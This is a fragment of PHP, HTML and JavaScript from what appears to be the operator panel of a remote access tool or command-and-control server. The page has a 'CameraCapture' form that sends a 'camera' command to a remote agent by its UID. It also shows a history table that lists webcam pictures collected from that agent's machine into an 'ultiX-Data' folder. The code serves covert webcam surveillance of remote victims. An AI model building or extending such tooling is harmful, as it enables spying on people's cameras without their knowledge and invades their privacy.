                     ...
                     <div class="card">
                        <div class="card-body">
                           ...
                           <div class="list-group">
                              ...
                              <?php echo '<a href="#" class="list-group-item list-group-item-action px-3 border-0 ripple active"> <i class="bi bi-camera"></i> Camera</a>'?>
                  ...
                  <div class="col">
                     <div class="row">
                        <div class="col">
                           <div class="card">
                              <div class="card-body">
                                 <h2> <i class="bi bi-camera"></i> CameraCapture</h2>
                                 <hr class="my-2">
                                 <h6>Num. of Camera: </h6>
                                 <div class="form-group-sm">
                                    <input class="form-control form-control-sm" type="text" maxlength="1"  placeholder="1" id="cam">
                                 </div>
                                 <hr class="my-2">
                                 <div id="alerts"> </div>
                                 <button onclick="sendCamera()" type="button" class="btn btn-primary"> Send Command  <i class="bi bi-arrow-up-right-circle-fill"></i> </button>
                           ...
                           <div class="col">
                              <div class="screencapture-history">
                                 <div class="card">
                                    <div class="card-body">
                                       <h2> <i class="bi bi-clock-history"></i> CameraCapture - History</h2>
                                       <hr class="my-2">
                                       <table class="table data-table table-bordered table-hover" id="">
                                          ...
                                          <tbody>
                                             <?php
                                             $uid_camera_folder = "../../ultiX-Data/".$agent_UID."/camera";
                                             $pictures = glob($uid_camera_folder."/*.png");
                                             
                                             foreach($pictures as $Camerapictures) {


                                                $cameraName = explode('camera/', $Camerapictures);
                                                $fileName = explode('RandomStr', $Camerapictures);
                                                
                                                $firstDateCamera = str_replace(".png", "", $cameraName[1]);
                                                $datetime = substr($firstDateCamera, 0, strpos($firstDateCamera, "RandomStr"));
                                                echo "<tr>";
                                                echo '<td>'.$datetime.'</td>';
                                                echo '<td>'.'<a href="'.$Camerapictures.'"'.'>'.$fileName[1].'</a>'.'</td>';
                                                echo "</tr>";
                                             }
                                          ?>
                                          </tbody>
...
function sendCamera() {
   ...
   if (Cam == ""){
      alertMessageError(" ", "Not a valid Input");   
   } else {
      var command = {
         "command": "camera",
         "parameters": Cam,
